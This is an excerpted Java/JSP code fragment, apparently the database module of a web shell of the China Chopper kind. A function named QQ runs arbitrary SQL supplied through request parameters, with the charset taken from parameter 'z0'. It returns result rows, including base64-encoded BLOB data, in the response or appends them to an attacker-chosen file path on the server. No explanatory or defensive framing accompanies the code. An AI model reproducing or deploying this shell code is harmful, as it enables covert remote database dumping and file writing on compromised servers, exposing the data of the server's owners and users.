...
void QQ(String cs, String s, String q, StringBuffer sb, String p) throws Exception {
    ...
    boolean isInFileMode=q.indexOf("--f:") != -1;
    try {
        if (isInFileMode) {
            File file = new File(p);
            file.mkdirs();
            String filepath=q.substring(q.indexOf("--f:") + 4, q.length()).trim();
            if(filepath.charAt(0) != '/'){
                filepath = p + filepath;
            }
            bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(filepath), true), cs));
        }
        ResultSet r = m.executeQuery(isInFileMode ? q.substring(0, q.indexOf("--f:")) : q);
        ResultSetMetaData d = r.getMetaData();
        int n = d.getColumnCount();
        for (int i = 1; i <= n; i++) {
        	if (isInFileMode) {
        		bw.write("'" + d.getColumnName(i) + "'\t");
        	}else{
        ...
        while (r.next()) {
            for (int i = 1; i <= n; i++) {
            	String colData;
            	if(d.getColumnTypeName(i).equals("BLOB")){
            		colData = (new sun.misc.BASE64Encoder()).encode( r.getBlob(i).getBytes(1, (int)(r.getBlob(i).length())) );
            	}else{
            		colData = r.getString(i);
            	}
            	colData = EC(colData, cs);
                if (isInFileMode) {
                	bw.write("'" + colData + "'\t");
                } else {
                    sb.append(colData + "\t|\t");
...
cs = request.getParameter("z0")==null ? "UTF-8" : cs;
